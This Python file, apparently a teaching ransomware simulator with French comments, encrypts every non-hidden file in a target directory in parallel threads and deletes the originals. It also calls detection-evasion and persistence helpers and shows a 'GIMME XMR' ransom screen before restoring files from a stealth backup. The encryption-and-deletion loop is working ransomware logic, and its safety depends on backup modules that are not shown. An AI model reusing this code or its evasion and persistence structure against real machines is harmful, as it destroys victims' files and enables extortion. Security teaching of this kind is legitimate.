import threading
import time
import random
import getpass
import shutil
from pathlib import Path

import evasion
import encrypt as crypto_manager
import file_system
import ui_manager

class RansomwareSimulator:
    def __init__(self):
        self.target_dir = None
        self.backup_dir = None
        self.backup_mapping = {}
        self.encrypted_files = []
        self.key = None

    def process_encryption(self, file_path, key):
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            encrypted = crypto_manager.encrypt_data(content, key)
            new_name = file_path.with_suffix(file_path.suffix + '.encrypted')
            with open(new_name, 'wb') as f:
                f.write(encrypted)
            time.sleep(random.uniform(0.1, 0.5))
            file_path.unlink()
            self.encrypted_files.append(str(new_name))
        except Exception as e:
            print(f"❌ Erreur: {e}")

    def run(self):
        print("🚀 INITIALISATION DE LA SIMULATION...")
        
        # 1. Phase Préparation
        self.target_dir = file_system.get_target_directory()
        evasion.evade_detection()
        self.backup_dir, self.backup_mapping = file_system.create_stealth_backup(self.target_dir)
        
        # 2. Phase Attaque
        teacher_pw = getpass.getpass("🔐 Password de sécurité (pour le prof) : ")
        self.key = crypto_manager.generate_strong_key(teacher_pw)
        
        threads = []
        for file_path in self.target_dir.glob("*"):
            if file_path.is_file() and not file_path.name.startswith('.'):
                t = threading.Thread(target=self.process_encryption, args=(file_path, self.key))
                t.start()
                threads.append(t)
        for t in threads: t.join()
        
        # 3. Phase Visuelle (L'interface GIMME XMR)
        p_path = evasion.simulate_persistence()
        evasion.clear_screen()
        print("⚠️  Lancement de l'écran de rançon...")
        ui_manager.launch_ransom_gui() # Le code s'arrête ici jusqu'à la fermeture de la fenêtre
        
        # 4. Phase Post-Simulation (Restauration)
        print("\n🔒 Fenêtre fermée. Début de la restauration d'urgence...")
        file_system.restore_files(self.backup_mapping)
        
        # Nettoyage
        if self.backup_dir: 
            shutil.rmtree(self.backup_dir)
            
        print("\n✅ SIMULATION TERMINÉE. Aucun fichier n'a été perdu.")
        print(f"📍 Persistance simulée à : {p_path}")

if __name__ == "__main__":
    sim = RansomwareSimulator()
    sim.run()
